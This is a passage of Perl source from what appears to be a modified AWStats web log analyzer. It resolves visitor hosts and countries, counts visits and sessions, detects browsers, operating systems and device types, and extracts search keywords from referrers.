		if ($line =~ /\"[A-Z]+\s+\S+\s+(HTTP\/[\d\.]+)\"/i) {
			$protocol = $1;
		} elsif ($line =~ /\"[A-Z]+\s+\S+\s+(HTTP\/\d)\"/i) {
			$protocol = $1;
		}

		if ($protocol) {
			$_protocol_h{$protocol}++;
			if ($pos_size > 0) {
				$_protocol_k{$protocol} += int($field[$pos_size]);
			}
		} elsif ($Debug && $Debug >= 2) {
			# 调试模式下记录无法提取协议的行
			debug("Failed to extract HTTP protocol from: $line", 2);
		}
		# Do DNS lookup
		#--------------
		my $Host         = $field[$pos_host];
		my $HostResolved = $Host; 
		# HostResolved will be defined in next paragraf if countedtraffic is true
		# Host may sometimes have an ip:port syntax (ex: 54.32.12.12:60321)
		if( $Host =~ /^([^:]+):[0-9]+$/ ){
			$Host = $1;
			$HostResolved = $Host;
		}


		if ( !$countedtraffic || $countedtraffic == 6) {
			my $ip = 0;
			if ($DNSLookup) {    # DNS lookup is 1 or 2
				if ( $Host =~ /$regipv4l/o ) {    # IPv4 lighttpd
					$Host =~ s/^::ffff://;
					$ip = 4;
				}
				elsif ( $Host =~ /$regipv4/o ) { $ip = 4; }    # IPv4
				elsif ( $Host =~ /$regipv6/o ) { $ip = 6; }    # IPv6
				if ($ip) {

					# Check in static DNS cache file
					$HostResolved = $MyDNSTable{$Host};
					if ($HostResolved) {
						if ($Debug) {
							debug( "  DNS lookup asked for $Host and found in static DNS cache file: $HostResolved",
								4
							);
						}
					}
					elsif ( $DNSLookup == 1 ) {

		   # Check in session cache (dynamic DNS cache file + session DNS cache)
						$HostResolved = $TmpDNSLookup{$Host};
						if ( !$HostResolved ) {
							if ( @SkipDNSLookupFor && &SkipDNSLookup($Host) ) {
								$HostResolved = $TmpDNSLookup{$Host} = '*';
								if ($Debug) {
									debug( "  No need of reverse DNS lookup for $Host, skipped at user request.",
										4
									);
								}
							}
							else {
								if ( $ip == 4 ) {
									my $lookupresult =
									  gethostbyaddr(
										pack( "C4", split( /\./, $Host ) ),
										AF_INET )
									  ; # This is very slow, may spend 20 seconds
									if (   !$lookupresult
										|| $lookupresult =~ /$regipv4/o
										|| !IsAscii($lookupresult) )
									{
										$TmpDNSLookup{$Host} = $HostResolved =
										  '*';
									}
									else {
										$TmpDNSLookup{$Host} = $HostResolved =
										  $lookupresult;
									}
									if ($Debug) {
										debug( " Reverse DNS lookup for $Host done: $HostResolved",
											4
										);
									}
								}
								elsif ( $ip == 6 ) {
									if ( $PluginsLoaded{'GetResolvedIP'}
										{'ipv6'} )
									{
										my $lookupresult =
										  GetResolvedIP_ipv6($Host);
										if (   !$lookupresult
											|| !IsAscii($lookupresult) )
										{
											$TmpDNSLookup{$Host} =
											  $HostResolved = '*';
										}
										else {
											$TmpDNSLookup{$Host} =
											  $HostResolved = $lookupresult;
										}
									}
									else {
										$TmpDNSLookup{$Host} = $HostResolved =
										  '*';
										warning( "Reverse DNS lookup for $Host not available without ipv6 plugin enabled."
										);
									}
								}
								else { error("Bad value vor ip"); }
							}
						}
					}
					else {
						$HostResolved = '*';
						if ($Debug) {
							debug( "  DNS lookup by static DNS cache file asked for $Host but not found.",
								4
							);
						}
					}
				}
				else {
					if ($Debug) {
						debug( "  DNS lookup asked for $Host but this is not an IP address.",
							4
						);
					}
					$DNSLookupAlreadyDone = $LogFile;
				}
			}
			else {
				if ( $Host =~ /$regipv4l/o ) {
					$Host =~ s/^::ffff://;
					$HostResolved = '*';
					$ip           = 4;
				}
				elsif ( $Host =~ /$regipv4/o ) {
					$HostResolved = '*';
					$ip           = 4;
				}    # IPv4
				elsif ( $Host =~ /$regipv6/o ) {
					$HostResolved = '*';
					$ip           = 6;
				}    # IPv6
				if ($Debug) { debug( "  No DNS lookup asked.", 4 ); }
			}

			# Analyze: Country (Top-level domain)
			#------------------------------------
			if ($Debug) {
				debug( "  Search country (Host=$Host HostResolved=$HostResolved ip=$ip)",
					4
				);
			}
			my $Domain = 'ip';

			# Set $HostResolved to host and resolve domain
			if ( $HostResolved eq '*' ) {

				# $Host is an IP address and is not resolved (failed or not asked) or resolution gives an IP address
				$HostResolved = $Host;

				# Resolve Domain
				if ( $PluginsLoaded{'GetCountryCodeByAddr'}{'geoip6'} ) {
					$Domain = GetCountryCodeByAddr_geoip6($HostResolved);
				}
				elsif ( $PluginsLoaded{'GetCountryCodeByAddr'}{'geoip'} ) {
					$Domain = GetCountryCodeByAddr_geoip($HostResolved);
				}

				# elsif ($PluginsLoaded{'GetCountryCodeByAddr'}{'geoip_region_maxmind'}) { $Domain=GetCountryCodeByAddr_geoip_region_maxmind($HostResolved); }
				# elsif ($PluginsLoaded{'GetCountryCodeByAddr'}{'geoip_city_maxmind'})   { $Domain=GetCountryCodeByAddr_geoip_city_maxmind($HostResolved); }
				elsif ( $PluginsLoaded{'GetCountryCodeByAddr'}{'geoipfree'} ) {
					$Domain = GetCountryCodeByAddr_geoipfree($HostResolved);
				}
				elsif ( $PluginsLoaded{'GetCountryCodeByAddr'}{'geoip2_country'} ) {
					$Domain = GetCountryCodeByAddr_geoip2_country($HostResolved);
				}
				if ($AtLeastOneSectionPlugin) {
					foreach my $pluginname (
						keys %{ $PluginsLoaded{'SectionProcessIp'} } )
					{
						my $function = "SectionProcessIp_$pluginname";
						if ($Debug) {
							debug( "  Call to plugin function $function", 5 );
						}
						&$function($HostResolved);
					}
				}
			}
			else {

				# $Host was already a host name ($ip=0, $Host=name, $HostResolved='') or has been resolved ($ip>0, $Host=ip, $HostResolved defined)
				$HostResolved = lc( $HostResolved ? $HostResolved : $Host );

				# Resolve Domain
				if ($ip)
				{    # If we have ip, we use it in priority instead of hostname
					if ( $PluginsLoaded{'GetCountryCodeByAddr'}{'geoip6'} ) {
						$Domain = GetCountryCodeByAddr_geoip6($Host);
					}
					elsif ( $PluginsLoaded{'GetCountryCodeByAddr'}{'geoip'} ) {
						$Domain = GetCountryCodeByAddr_geoip($Host);
					}

					# elsif ($PluginsLoaded{'GetCountryCodeByAddr'}{'geoip_region_maxmind'}) { $Domain=GetCountryCodeByAddr_geoip_region_maxmind($Host); }
					# elsif ($PluginsLoaded{'GetCountryCodeByAddr'}{'geoip_city_maxmind'})   { $Domain=GetCountryCodeByAddr_geoip_city_maxmind($Host); }
					elsif (
						$PluginsLoaded{'GetCountryCodeByAddr'}{'geoipfree'} )
					{
						$Domain = GetCountryCodeByAddr_geoipfree($Host);
					}
					elsif (
						$PluginsLoaded{'GetCountryCodeByAddr'}{'geoip2_country'} )
					{
						$Domain = GetCountryCodeByAddr_geoip2_country($Host);
					}
					elsif ( $HostResolved =~ /\.(\w+)$/ ) { $Domain = $1; }
					if ($AtLeastOneSectionPlugin) {
						foreach my $pluginname (
							keys %{ $PluginsLoaded{'SectionProcessIp'} } )
						{
							my $function = "SectionProcessIp_$pluginname";
							if ($Debug) {
								debug( "  Call to plugin function $function",
									5 );
							}
							&$function($Host);
						}
					}
				}
				else {
					if ( $PluginsLoaded{'GetCountryCodeByName'}{'geoip6'} ) {
						$Domain = GetCountryCodeByName_geoip6($HostResolved);
					}
					elsif ( $PluginsLoaded{'GetCountryCodeByName'}{'geoip'} ) {
						$Domain = GetCountryCodeByName_geoip($HostResolved);
					}

					# elsif ($PluginsLoaded{'GetCountryCodeByName'}{'geoip_region_maxmind'}) { $Domain=GetCountryCodeByName_geoip_region_maxmind($HostResolved); }
					# elsif ($PluginsLoaded{'GetCountryCodeByName'}{'geoip_city_maxmind'})   { $Domain=GetCountryCodeByName_geoip_city_maxmind($HostResolved); }
					elsif (
						$PluginsLoaded{'GetCountryCodeByName'}{'geoipfree'} )
					{
						$Domain = GetCountryCodeByName_geoipfree($HostResolved);
					}
					elsif (
						$PluginsLoaded{'GetCountryCodeByName'}{'geoip2_country'} )
					{
						$Domain = GetCountryCodeByName_geoip2_country($HostResolved);
					}
					elsif ( $HostResolved =~ /\.(\w+)$/ ) { $Domain = $1; }
					if ($AtLeastOneSectionPlugin) {
						foreach my $pluginname (
							keys %{ $PluginsLoaded{'SectionProcessHostname'} } )
						{
							my $function = "SectionProcessHostname_$pluginname";
							if ($Debug) {
								debug( "  Call to plugin function $function",
									5 );
							}
							&$function($HostResolved);
						}
					}
				}
			}

			# Store country
			if ($PageBool) { $_domener_p{$Domain}++; }
			if ($countedtraffic != 6){$_domener_h{$Domain}++;}
			if ( $field[$pos_size] ne '-' && $pos_size>0) {
				$_domener_k{$Domain} += int( $field[$pos_size] );
			}

			# Analyze: Host, URL entry+exit and Session
			#------------------------------------------
			if ($PageBool) {
				my $timehostl = $_host_l{$HostResolved};
				if ($timehostl) {

					# A visit for this host was already detected
					# TODO everywhere there is $VISITTIMEOUT
					#				$timehostl =~ /^\d\d\d\d\d\d(\d\d)/; my $daytimehostl=$1;
					#				if ($timerecord > ($timehostl+$VISITTIMEOUT+($dateparts[3]>$daytimehostl?$NEWDAYVISITTIMEOUT:0))) {
					if ( $timerecord > ( $timehostl + $VISITTIMEOUT ) ) {

						# This is a second visit or more
						if ( !$_waithost_s{$HostResolved} ) {

							# This is a second visit or more
							# We count 'visit','exit','entry','DayVisits'
							if ($Debug) {
								debug( "  This is a second visit for $HostResolved.",
									4
								);
							}
							my $timehosts = $_host_s{$HostResolved};
							my $page      = $_host_u{$HostResolved};
							if ($page) { $_url_x{$page}++; }
							$_url_e{ $field[$pos_url] }++;
							$DayVisits{$yearmonthdayrecord}++;

							# We can't count session yet because we don't have the start so
							# we save params of first 'wait' session
							$_waithost_l{$HostResolved} = $timehostl;
							$_waithost_s{$HostResolved} = $timehosts;
							$_waithost_u{$HostResolved} = $page;
						}
						else {

							# This is third visit or more
							# We count 'session','visit','exit','entry','DayVisits'
							if ($Debug) {
								debug( "  This is a third visit or more for $HostResolved.",
									4
								);
							}
							my $timehosts = $_host_s{$HostResolved};
							my $page      = $_host_u{$HostResolved};
							if ($page) { $_url_x{$page}++; }
							$_url_e{ $field[$pos_url] }++;
							$DayVisits{$yearmonthdayrecord}++;
							if ($timehosts) {
								my $session_range = GetSessionRange($timehosts, $timehostl, $field[$pos_url]);
								if (defined $session_range) {
									$_session{$session_range}++;
								}
							}
						}

						# Save new session properties
						$_host_s{$HostResolved} = $timerecord;
						$_host_l{$HostResolved} = $timerecord;
						$_host_u{$HostResolved} = $field[$pos_url];
					}
					elsif ( $timerecord > $timehostl ) {

						# This is a same visit we can count
						if ($Debug) {
							debug( "  This is same visit still running for $HostResolved. host_l/host_u changed to $timerecord/$field[$pos_url]",
								4
							);
						}
						$_host_l{$HostResolved} = $timerecord;
						$_host_u{$HostResolved} = $field[$pos_url];
					}
					elsif ( $timerecord == $timehostl ) {

						# This is a same visit we can count
						if ($Debug) {
							debug( "  This is same visit still running for $HostResolved. host_l/host_u changed to $timerecord/$field[$pos_url]",
								4
							);
						}
						$_host_u{$HostResolved} = $field[$pos_url];
					}
					elsif ( $timerecord < $_host_s{$HostResolved} ) {

					   # Should happens only with not correctly sorted log files
						if ($Debug) {
							debug( "  This is same visit still running for $HostResolved with start not in order. host_s changed to $timerecord (entry page also changed if first visit)",
								4
							);
						}
						if ( !$_waithost_s{$HostResolved} ) {

						# We can reorder entry page only if it's the first visit found in this update run (The saved entry page was $_waithost_e if $_waithost_s{$HostResolved} is not defined. If second visit or more, entry was directly counted and not saved)
							$_waithost_e{$HostResolved} = $field[$pos_url];
						}
						else {

						# We can't change entry counted as we dont't know what was the url counted as entry
						}
						$_host_s{$HostResolved} = $timerecord;
					}
					else {
						if ($Debug) {
							debug( "  This is same visit still running for $HostResolved with hit between start and last hits. No change",
								4
							);
						}
					}
				}
				else {

					# This is a new visit (may be). First new visit found for this host. We save in wait array the entry page to count later
					if ($Debug) {
						debug( "  New session (may be) for $HostResolved. Save in wait array to see later",
							4
						);
					}
					$_waithost_e{$HostResolved} = $field[$pos_url];

					# Save new session properties
					$_host_u{$HostResolved} = $field[$pos_url];
					$_host_s{$HostResolved} = $timerecord;
					$_host_l{$HostResolved} = $timerecord;
				}
				$_host_p{$HostResolved}++;
			}
			$_host_h{$HostResolved}++;
			if ( $field[$pos_size] ne '-' && $pos_size>0) {
				$_host_k{$HostResolved} += int( $field[$pos_size] );
			}

			# Analyze: Browser - OS
			#----------------------
			if ( $pos_agent >= 0 ) {
				
				if ($LevelForBrowsersDetection) {
					# 获取并缓存设备类型
					my $device_type = '';
					if (defined &get_device_type) {
						$device_type = get_device_type($UserAgent);
						$TmpDevice{$UserAgent} = $device_type;
						
						# 调试输出
						debug("=== Device Debug ===", 1) if $Debug;
						debug("UA: $UserAgent", 1) if $Debug;
						debug("Detected device: $device_type", 1) if $Debug;
						debug("PageBool: $PageBool, countedtraffic: $countedtraffic", 1) if $Debug;
						
						if ($device_type ne 'desktop' && $device_type ne 'unknown') {
							$_device_h{$device_type}++;
							if ($PageBool) { 
								$_device_p{$device_type}++; 
							}
							debug("STORED: $device_type (total: $_device_h{$device_type})", 1) if $Debug;
						} else {
							debug("NOT STORED: $device_type (desktop or unknown)", 1) if $Debug;
						}
						debug("==========", 1) if $Debug;
					}
					
					# Analyze: Browser
					#-----------------
					my $uabrowser = $TmpBrowser{$UserAgent};
					if ( !$uabrowser ) {
						my $found = 1;

						# Edge (must be at beginning)
						if ($UserAgent =~ /$regveredge/o)
						{
							$_browser_h{"edge$1"}++;
							if ($PageBool) { $_browser_p{"edge$1"}++; }
							$TmpBrowser{$UserAgent} = "edge$1";
						}
						
						# Opera ?
						elsif ( $UserAgent =~ /$regveropera/o ) {
							$_browser_h{"opera".($1||$2)}++;
							if ($PageBool) { $_browser_p{"opera".($1||$2)}++; }
							$TmpBrowser{$UserAgent} = "opera".($1||$2);
						}
						
						# Firefox ?
						elsif ( $UserAgent =~ /$regverfirefox/o
							&& $UserAgent !~ /$regnotfirefox/o )
						{
							$_browser_h{"firefox$1"}++;
							if ($PageBool) { $_browser_p{"firefox$1"}++; }
							$TmpBrowser{$UserAgent} = "firefox$1";
						}
										
						# Chrome ?
						elsif ( $UserAgent =~ /$regverchrome/o ) {
							$_browser_h{"chrome$1"}++;
							if ($PageBool) { $_browser_p{"chrome$1"}++; }
							$TmpBrowser{$UserAgent} = "chrome$1";
						}
						
						# Brave ?
						elsif ( $UserAgent =~ /$regverbrave/o ) {
							$_browser_h{"brave$1"}++;
							if ($PageBool) { $_browser_p{"brave$1"}++; }
							$TmpBrowser{$UserAgent} = "brave$1";
						}

						# Vivaldi ?
						elsif ( $UserAgent =~ /$regvervivaldi/o ) {
							$_browser_h{"vivaldi$1"}++;
							if ($PageBool) { $_browser_p{"vivaldi$1"}++; }
							$TmpBrowser{$UserAgent} = "vivaldi$1";
						}

						# Yandex ?
						elsif ( $UserAgent =~ /$regveryandex/o ) {
							$_browser_h{"yandex$1"}++;
							if ($PageBool) { $_browser_p{"yandex$1"}++; }
							$TmpBrowser{$UserAgent} = "yandex$1";
						}

						# Whale ?
						elsif ( $UserAgent =~ /$regverwhale/o ) {
							$_browser_h{"whale$1"}++;
							if ($PageBool) { $_browser_p{"whale$1"}++; }
							$TmpBrowser{$UserAgent} = "whale$1";
						}

						# Edge Chromium (新版 Edge)
						elsif ( $UserAgent =~ /$regveredg/o ) {
							$_browser_h{"edge$1"}++;
							if ($PageBool) { $_browser_p{"edge$1"}++; }
							$TmpBrowser{$UserAgent} = "edge$1";
						}

						# Opera Chromium (新版 Opera)
						elsif ( $UserAgent =~ /$regveropr/o ) {
							$_browser_h{"opera$1"}++;
							if ($PageBool) { $_browser_p{"opera$1"}++; }
							$TmpBrowser{$UserAgent} = "opera$1";
						}
						
						# Safari ?
						elsif ($UserAgent =~ /$regversafari/o && $UserAgent !~ /$regnotsafari/o) {
							my $build = $1 || '';
							my $safariver = '';
							if ($UserAgent =~ /version\/([\d\.]+)/i) {
								$safariver = $1;
								debug("Safari version from Version/ tag: $safariver") if $Debug;
							} 
							else {
								$safariver = get_safari_version($build);
								debug("Safari version from build $build: $safariver") if $Debug;
							}
							$safariver = $build if $safariver eq '';
							if ($UserAgent =~ /$regversafariver/o) {
								$safariver = $1 || $safariver;
							}
							$_browser_h{"safari$safariver"}++;
							if ($PageBool) { $_browser_p{"safari$safariver"}++; }
							$TmpBrowser{$UserAgent} = "safari$safariver";
						}
						
						# Konqueror ?
						elsif ( $UserAgent =~ /$regverkonqueror/o ) {
							$_browser_h{"konqueror$1"}++;
							if ($PageBool) { $_browser_p{"konqueror$1"}++; }
							$TmpBrowser{$UserAgent} = "konqueror$1";
						}

						# Subversion ?
						elsif ( $UserAgent =~ /$regversvn/o ) {
							$_browser_h{"svn$1"}++;
							if ($PageBool) { $_browser_p{"svn$1"}++; }
							$TmpBrowser{$UserAgent} = "svn$1";
						}

						# IE < 11 ? (must be at end of test)
						elsif ($UserAgent =~ /$regvermsie/o
							&& $UserAgent !~ /$regnotie/o )
						{
							$_browser_h{"msie$2"}++;
							if ($PageBool) { $_browser_p{"msie$2"}++; }
							$TmpBrowser{$UserAgent} = "msie$2";
						}
						
						# IE >= 11
						elsif ($UserAgent =~ /$regvermsie11/o && $UserAgent !~ /$regnotie/o)
						{
							$_browser_h{"msie$2"}++;
							if ($PageBool) { $_browser_p{"msie$2"}++; }
							$TmpBrowser{$UserAgent} = "msie$2";
						}

						# Netscape 6.x, 7.x ... ? (must be at end of test)
						elsif ( $UserAgent =~ /$regvernetscape/o ) {
							$_browser_h{"netscape$1"}++;
							if ($PageBool) { $_browser_p{"netscape$1"}++; }
							$TmpBrowser{$UserAgent} = "netscape$1";
						}

						# Netscape 3.x, 4.x ... ? (must be at end of test)
						elsif ($UserAgent =~ /$regvermozilla/o
							&& $UserAgent !~ /$regnotnetscape/o )
						{
							$_browser_h{"netscape$2"}++;
							if ($PageBool) { $_browser_p{"netscape$2"}++; }
							$TmpBrowser{$UserAgent} = "netscape$2";
						}

						# Other known browsers ?
						# Search ID in order of BrowsersSearchIDOrder
						# TODO If browser is in a family, use version
						else {
							$found = 0;
							foreach (@BrowsersSearchIDOrder)
							{
								if ( $UserAgent =~ /$_/ ) {
									my $browser = &UnCompileRegex($_);
									$_browser_h{"$browser"}++;
									if ($PageBool) { $_browser_p{"$browser"}++; }
									$TmpBrowser{$UserAgent} = "$browser";
									$found = 1;
									last;
								}
							}
						}

						# Unknown browser ?
						if ( !$found ) {
							$_browser_h{'Unknown'}++;
							if ($PageBool) { $_browser_p{'Unknown'}++; }
							$TmpBrowser{$UserAgent} = 'Unknown';
							$_unknownrefererbrowser_l{$UserAgent} = $timerecord;
						}
					}
					else {
						$_browser_h{$uabrowser}++;
						if ($PageBool) { $_browser_p{$uabrowser}++; }
						if ( $uabrowser eq 'Unknown' ) {
							$_unknownrefererbrowser_l{$UserAgent} = $timerecord;
						}
					}
				}

				if ($LevelForOSDetection) {
					# Analyze: OS
					#------------
					my $uaos = $TmpOS{$UserAgent};
					if ( !$uaos ) {
						my $found = 0;
						
						my $device_type = $TmpDevice{$UserAgent};
						if (defined &get_mobile_os) {
							my $mobile_os = get_mobile_os($UserAgent);
							if ($mobile_os ne 'unknown') {
								if ($device_type ne 'desktop' && $device_type ne 'unknown') {
									$_device_h{$device_type}++;
									if ($PageBool) { $_device_p{$device_type}++; }
								}
								$TmpOS{$UserAgent} = $device_type;
								$found = 1;
								if ($Debug) {
									debug("Device (mobile): $device_type", 2);
								}
							}
						}
						
						# 如果移动OS检测没匹配，使用 OSHashID 列表
						if (!$found) {
							foreach (@OSSearchIDOrder) {
								if ( $UserAgent =~ /$_/ ) {
									my $osid = $OSHashID{ &UnCompileRegex($_) };
									
									if ($device_type ne 'desktop' && $device_type ne 'unknown') {
										$_device_h{$device_type}++;
										if ($PageBool) { $_device_p{$device_type}++; }
									} else {
										$_os_h{"$osid"}++;
										if ($PageBool) { $_os_p{"$osid"}++; }
									}
									$TmpOS{$UserAgent} = "$osid";
									$found = 1;
									last;
								}
							}
						}
						
						# Unknown OS
						if ( !$found ) {
							if ($device_type ne 'desktop' && $device_type ne 'unknown') {
								$_device_h{$device_type}++;
								if ($PageBool) { $_device_p{$device_type}++; }
							} else {
								$_os_h{'Unknown'}++;
								if ($PageBool) { $_os_p{'Unknown'}++; }
							}
							$TmpOS{$UserAgent} = $device_type;
							if ( $countedtraffic != 4 ) {
								$_unknownreferer_l{$UserAgent} = $timerecord;
							}
						}
					}
					else {
						# 已有缓存
						my $device_type = $TmpDevice{$UserAgent};
						if ($device_type ne 'desktop' && $device_type ne 'unknown') {
							$_device_h{$device_type}++;
							if ($PageBool) { $_device_p{$device_type}++; }
						} elsif ($uaos =~ /mobile|tablet|tv|watch|wear|bot/i) {
							$_device_h{$uaos}++;
							if ($PageBool) { $_device_p{$uaos}++; }
						} else {
							$_os_h{$uaos}++;
							if ($PageBool) { $_os_p{$uaos}++; }
						}
						if ( $uaos eq 'Unknown' ) {
							if ( $countedtraffic != 4 ) {
								$_unknownreferer_l{$UserAgent} = $timerecord;
							}
						}
					}
				}
			}
			else {
				$_browser_h{'Unknown'}++;
				$_os_h{'Unknown'}++;
				if ($PageBool) {
					$_browser_p{'Unknown'}++;
					$_os_p{'Unknown'}++;
				}
			}
			# Analyze: Referer
			#-----------------
			my $found = 0;
			if (   $pos_referer >= 0
				&& $LevelForRefererAnalyze
				&& $field[$pos_referer] )
			{

				# Direct ?
				if (   $field[$pos_referer] eq '-'
					|| $field[$pos_referer] eq 'bookmarks' )
				{  # "bookmarks" is sent by Netscape, '-' by all others browsers
						# Direct access
					if ($PageBool) {
						if ($ShowDirectOrigin) {
							print "Direct access for line $line\n";
						}
						$_from_p[0]++;
					}
					$_from_h[0]++;
					$found = 1;
				}
				else {
					$field[$pos_referer] =~ /$regreferer/o;
					my $refererprot   = $1;
					my $refererserver =
						( $2 || '' )
					  . ( !$3 || $3 eq ':80' ? '' : $3 )
					  ; # refererserver is www.xxx.com or www.xxx.com:81 but not www.xxx.com:80
						# HTML link ?
					if ( $refererprot =~ /^http/i ) {

						#if ($Debug) { debug("  Analyze referer refererprot=$refererprot refererserver=$refererserver",5); }

						# Kind of origin
						if ( !$TmpRefererServer{$refererserver} )
						{ # TmpRefererServer{$refererserver} is "=" if same site, "search egine key" if search engine, not defined otherwise
							if ( $refererserver =~ /$reglocal/o ) {

						  		# Intern (This hit came from another page of the site)
								if ($Debug) {
									debug( "  Server '$refererserver' is added to TmpRefererServer with value '='",
										2
									);
								}
								$TmpRefererServer{$refererserver} = '=';
								$found = 1;
							}
							else {
								foreach (@HostAliases) {
									if ( $refererserver =~ /$_/ ) {

						  				# Intern (This hit came from another page of the site)
										if ($Debug) {
											debug( "  Server '$refererserver' is added to TmpRefererServer with value '='",
												2
											);
										}
										$TmpRefererServer{$refererserver} = '=';
										$found = 1;
										last;
									}
								}
								if ( !$found ) {
							 		# Extern (This hit came from an external web site).
									if ($LevelForSearchEnginesDetection) {

										foreach (@SearchEnginesSearchIDOrder)
										{ # Search ID in order of SearchEnginesSearchIDOrder
											if ( $refererserver =~ /$_/ ) {
												my $key = &UnCompileRegex($_);
												if ( !$NotSearchEnginesKeys{$key} || $refererserver !~ /$NotSearchEnginesKeys{$key}/i )
												{

									 				# This hit came from the search engine $key
													if ($Debug) {
														debug( "  Server '$refererserver' is added to TmpRefererServer with value '$key'",
															2
														);
													}
													$TmpRefererServer{
														$refererserver} =
													  $SearchEnginesHashID{ $key
													  };
													$found = 1;
												}
												last;
											}
										}

									}
								}
							}
						}

						my $tmprefererserver = $TmpRefererServer{$refererserver};
						if ($tmprefererserver) {
							if ( $tmprefererserver eq '=' ) {
								# Intern (This hit came from another page of the site)
								if ($PageBool) { $_from_p[4]++; }
								$_from_h[4]++;
								$found = 1;
							}
							else {
								# This hit came from a search engine
								if ($PageBool) {
									$_from_p[2]++;
									$_se_referrals_p{$tmprefererserver}++;
								}
								$_from_h[2]++;
								$_se_referrals_h{$tmprefererserver}++;
								$found = 1;
								
								if ( $PageBool && $LevelForKeywordsDetection ) {
									# === DEBUG: 开始关键字提取检测 ===
									if ($Debug) {
										debug("=== Keyword extraction started ===", 2);
										debug("Referer: $field[$pos_referer]", 2);
										debug("Search engine ID: $tmprefererserver", 2);
									}
									
									# we will complete %_keyphrases hash array
									my @refurl = split( /\?/, $field[$pos_referer], 2 );
									
									if ($Debug) {
										debug("Referer URL parts: base=" . ($refurl[0] || '') . ", query=" . ($refurl[1] || ''), 3);
									}
									
									if ( $refurl[1] ) {
										# Extract params of referer query string
										if ( $SearchEnginesKnownUrl{$tmprefererserver} ) {
											# Search engine with known URL syntax
											if ($Debug) {
												debug("Known URL syntax for $tmprefererserver: " . $SearchEnginesKnownUrl{$tmprefererserver}, 3);
											}
											
											foreach my $param ( split( /&/, $KeyWordsNotSensitive ? lc( $refurl[1] ) : $refurl[1] ) ) {
												if ($Debug) {
													debug("Checking param: $param", 4);
												}
												
												if ( $param =~ s/^$SearchEnginesKnownUrl{$tmprefererserver}// ) {
													if ($Debug) {
														debug("Found keyword parameter! Original param value: $param", 3);
													}
													
													# Clean the keyword
													$param =~ s/^(cache|related):[^\+]+//;
													&ChangeWordSeparatorsIntoSpace($param);
													$param =~ s/^ +//;
													$param =~ s/ +$//;
													$param =~ tr/ /\+/s;
													
													if ($Debug) {
														debug("Cleaned keyword: [$param] (length: " . length($param) . ")", 3);
													}
													
													if ( ( length $param ) > 0 and ( length $param ) < 80 ) {
														$_keyphrases{$param}++;
														if ($Debug) {
															debug("Keyword stored: $param -> count: $_keyphrases{$param}", 2);
														}
													} else {
														if ($Debug) {
															debug("Keyword rejected: length " . length($param) . " (must be between 1-80)", 3);
														}
													}
													last;
												}
											}
										}
										elsif ( $LevelForKeywordsDetection >= 2 ) {
											# Search engine with unknown URL syntax
											if ($Debug) {
												debug("Unknown URL syntax, using generic keyword extraction", 3);
											}
											
											foreach my $param ( split( /&/, $KeyWordsNotSensitive ? lc( $refurl[1] ) : $refurl[1] ) ) {
												if ($Debug) {
													debug("Checking param: $param", 4);
												}
												
												my $foundexcludeparam = 0;
												foreach my $paramtoexclude (@WordsToCleanSearchUrl) {
													if ( $param =~ /$paramtoexclude/i ) {
														$foundexcludeparam = 1;
														if ($Debug) {
															debug("Param excluded by rule: $paramtoexclude", 4);
														}
														last;
													}
												}
												
												if ($foundexcludeparam) {
													next;
												}
												
												# Extract value after =
												$param =~ s/.*=//;
												
												if ($Debug) {
													debug("Potential keyword value: $param", 4);
												}
												
												$param =~ s/^(cache|related):[^\+]+//;
												&ChangeWordSeparatorsIntoSpace($param);
												$param =~ s/^ +//;
												$param =~ s/ +$//;
												$param =~ tr/ /\+/s;
												
												if ($Debug) {
													debug("Cleaned keyword: [$param] (length: " . length($param) . ")", 3);
												}
												
												if ( ( length $param ) > 2 ) {
													$_keyphrases{$param}++;
													if ($Debug) {
														debug("Keyword stored: $param -> count: $_keyphrases{$param}", 2);
													}
													last;
												}
											}
										}
									}
									elsif ( $SearchEnginesWithKeysNotInQuery{$tmprefererserver} ) {
										# Search engine with key inside page URL (like a9.com)
										if ($Debug) {
											debug("Search engine uses keys in URL path (not query)", 3);
											debug("Checking URL path: $refurl[0]", 3);
										}
										
										if ( $refurl[0] =~ /$SearchEnginesKnownUrl{$tmprefererserver}(.*)$/ ) {
											my $param = $1;
											if ($Debug) {
												debug("Found keyword in path: $param", 3);
											}
											
											&ChangeWordSeparatorsIntoSpace($param);
											$param =~ tr/ /\+/s;
											
											if ($Debug) {
												debug("Cleaned keyword: $param (length: " . length($param) . ")", 3);
											}
											
											if ( ( length $param ) > 0 ) {
												$_keyphrases{$param}++;
												if ($Debug) {
													debug("Keyword stored: $param -> count: $_keyphrases{$param}", 2);
												}
											}
										} else {
											if ($Debug) {
												debug("No keyword found in URL path", 3);
											}
										}
									}
									
									if ($Debug) {
										debug("=== Keyword extraction completed ===", 2);
										debug("Total keyphrases in database: " . scalar(keys %_keyphrases), 2);
									}
								} # End of if ( $PageBool && $LevelForKeywordsDetection )
							} # End of else (search engine branch)
						} # End of if ($tmprefererserver)
						else {

						  # This hit came from a site other than a search engine
							if ($PageBool) { $_from_p[3]++; }
							$_from_h[3]++;

							# http://www.mysite.com/ must be same referer than http://www.mysite.com but .../mypage/ differs of .../mypage
							#if ($refurl[0] =~ /^[^\/]+\/$/) { $field[$pos_referer] =~ s/\/$//; }	# Code moved in Save_History
							# TODO: lowercase the value for referer server to have refering server not case sensitive
							if ($URLReferrerWithQuery) {
								if ($PageBool) {
									$_pagesrefs_p{ $field[$pos_referer] }++;
								}
								$_pagesrefs_h{ $field[$pos_referer] }++;
							}
							else {

								# We discard query for referer
								if ( $field[$pos_referer] =~
									/$regreferernoquery/o )
								{
									if ($PageBool) { $_pagesrefs_p{"$1"}++; }
									$_pagesrefs_h{"$1"}++;
								}
								else {
									if ($PageBool) {
										$_pagesrefs_p{ $field[$pos_referer] }++;
									}
									$_pagesrefs_h{ $field[$pos_referer] }++;
								}
							}
							$found = 1;
						}
					}

					# News Link ?
					#if (! $found && $refererprot =~ /^news/i) {
					#	$found=1;
					#	if ($PageBool) { $_from_p[5]++; }
					#	$_from_h[5]++;
					#}
				}
			}

			# Origin not found
			if ( !$found ) {
				if ($ShowUnknownOrigin) {
					print "Unknown origin: $field[$pos_referer]\n";
				}
				if ($PageBool) { $_from_p[1]++; }
				$_from_h[1]++;
			}

			# Analyze: EMail
			#---------------
			if ( $pos_emails >= 0 && $field[$pos_emails] ) {
				if ( $field[$pos_emails] eq '<>' ) {
					$field[$pos_emails] = 'Unknown';
				}
				elsif ( $field[$pos_emails] !~ /\@/ ) {
					$field[$pos_emails] .= "\@$SiteDomain";
				}
				$_emails_h{ lc( $field[$pos_emails] ) }
				  ++;    #Count accesses for sender email (hit)
				if ($pos_size>0){$_emails_k{ lc( $field[$pos_emails] ) } +=
				  int( $field[$pos_size] )
